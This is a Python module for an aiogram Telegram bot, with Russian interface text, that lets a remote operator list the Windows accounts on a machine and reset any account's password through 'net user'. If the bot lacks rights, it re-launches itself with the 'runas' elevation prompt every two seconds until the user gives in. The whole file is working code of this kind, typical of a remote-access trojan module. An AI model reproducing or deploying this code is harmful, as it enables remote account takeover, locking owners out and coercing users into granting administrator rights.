from aiogram import Router
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import subprocess, sys, asyncio, ctypes

router = Router()

class PasswordState(StatesGroup):
    waiting_user = State()
    waiting_password = State()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def request_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )

def get_users():
    result = subprocess.run(
        ["net", "user"],
        capture_output=True, text=True, encoding="cp866", errors="ignore"
    )
    lines = result.stdout.split("\n")
    users = []
    for line in lines[4:]:
        if "---" in line or "команда" in line.lower() or "command" in line.lower() or not line.strip():
            continue
        for name in line.split():
            if name.strip():
                users.append(name.strip())
    return users

warn_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, продолжить", callback_data="pwd_confirm", style="danger"),
     InlineKeyboardButton(text="❌ Нет", callback_data="pwd_cancel", style="primary")]
])

@router.message(lambda m: m.text == "🔑 Сменить пароль")
async def password_warn(message: Message):
    await message.answer(
        "⚠️ <b>Внимание!</b>\n\n"
        "Эта функция требует прав администратора.\n"
        "Если права не выданы — бот будет запрашивать их снова и снова до тех пор, пока пользователь не примет.\n\n"
        "Продолжить?",
        reply_markup=warn_kb
    )

@router.callback_query(lambda c: c.data == "pwd_cancel")
async def pwd_cancel(callback: CallbackQuery):
    await callback.message.edit_text("↩️ Возврат в главное меню")
    await callback.answer()

@router.callback_query(lambda c: c.data == "pwd_confirm")
async def pwd_confirm(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    if sys.platform != "win32":
        await callback.message.edit_text("❌ Только Windows")
        return

    if not is_admin():
        await callback.message.edit_text("🔐 Запрашиваю права администратора...")
        asyncio.create_task(request_admin_loop(callback.message, state))
        return

    await show_users(callback.message, state)

async def request_admin_loop(message, state):
    while not is_admin():
        request_admin()
        await asyncio.sleep(2)
    await show_users(message, state)

async def show_users(message, state):
    users = get_users()
    if not users:
        await message.edit_text("❌ Не удалось получить список пользователей")
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"👤 {u}", callback_data=f"pwd_user_{u}")]
        for u in users[:10]
    ])
    await message.edit_text("👥 Выбери пользователя:", reply_markup=kb)

@router.callback_query(lambda c: c.data.startswith("pwd_user_"))
async def select_user(callback: CallbackQuery, state: FSMContext):
    username = callback.data.replace("pwd_user_", "")
    await state.update_data(username=username)
    await callback.message.edit_text(f"✏️ Введи новый пароль для <b>{username}</b>:")
    await state.set_state(PasswordState.waiting_password)
    await callback.answer()

@router.message(PasswordState.waiting_password)
async def set_password(message: Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    username = data.get("username")
    new_password = message.text.strip()
    try:
        result = subprocess.run(
            ["net", "user", username, new_password],
            capture_output=True, text=True, encoding="cp866", errors="ignore"
        )
        if result.returncode == 0:
            await message.answer(f"✅ Пароль для <b>{username}</b> изменён!")
        else:
            await message.answer(f"❌ Ошибка: <code>{result.stderr or result.stdout}</code>")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")
